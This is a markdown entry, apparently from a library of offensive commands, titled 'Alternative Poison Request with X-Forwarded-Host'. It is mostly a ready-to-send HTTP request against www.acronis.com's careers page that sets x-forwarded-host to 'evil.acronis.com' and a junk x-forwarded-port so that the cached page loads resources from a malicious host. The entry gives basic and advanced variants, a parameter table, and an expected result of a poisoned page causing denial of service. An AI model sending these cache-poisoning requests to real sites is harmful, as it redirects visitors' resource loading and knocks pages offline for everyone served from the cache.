---
data: >-
  GET /zh-cn/careers/?yig1bt7ai4=2 HTTP/1.1

  Host: www.acronis.com

  Connection: close

  Pragma: no-cache

  Cache-Control: no-cache

  sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"

  sec-ch-ua-mobile: ?0

  Upgrade-Insecure-Requests: 1

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
  (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36

  Accept: text/html,application/xhtml
  xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

  Sec-Fetch-Site: none

  Sec-Fetch-Mode: navigate

  Sec-Fetch-User: ?1

  Sec-Fetch-Dest: document

  x-forwarded-port: zwrtxqvas9lm4kzkia

  x-forwarded-host: evil.acronis.com

  Accept-Encoding: gzip, deflate

  Accept-Language: zh-CN,zh;q=0.9
tags:
  - http
  - poisoning
type: command
executor: bash
platforms:
  - Web
id: fa6df047-4419-486c-af59-ddfa970c04dc
created_at: '2025-12-13T09:00:34.166Z'
updated_at: '2025-12-13T09:00:34.166Z'
verified: false
validated: true
submitted: true
---
# Alternative Poison Request with X-Forwarded-Host

## Command

```bash
GET /zh-cn/careers/?yig1bt7ai4=2 HTTP/1.1
Host: www.acronis.com
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Chromium";v="86", "\"Not\\A;Brand";v="99", "Google Chrome";v="86"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36
Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
x-forwarded-port: zwrtxqvas9lm4kzkia
x-forwarded-host: evil.acronis.com
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

## Description

Sends an HTTP request to poison the cache using x-forwarded-host and x-forwarded-port, altering resource loading to a malicious host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `x-forwarded-host` | Sets malicious host like evil.acronis.com to alter resource loading | Yes |
| `x-forwarded-port` | Sets arbitrary port to poison cache | Yes |

## Examples

### Basic Usage

```bash
GET /zh-cn/careers/?yig1bt7ai4=2 HTTP/1.1
Host: www.acronis.com
x-forwarded-host: evil.acronis.com
x-forwarded-port: zwrtxqvas9lm4kzkia
```

### Advanced Usage

```bash
GET /zh-cn/careers/?yig1bt7ai4=2 HTTP/1.1
Host: www.acronis.com
x-forwarded-host: evil.acronis.com
x-forwarded-port: zwrtxqvas9lm4kzkia
Pragma: no-cache
Cache-Control: no-cache
```

## Expected Output

Poisoned page with resources loading from evil.acronis.com:0, causing DoS.

## Related

- [[procedures/Alternative-Poisoning-with-X-Forwarded-Host]]
- [[commands/poison-request-x-forwarded-port]]
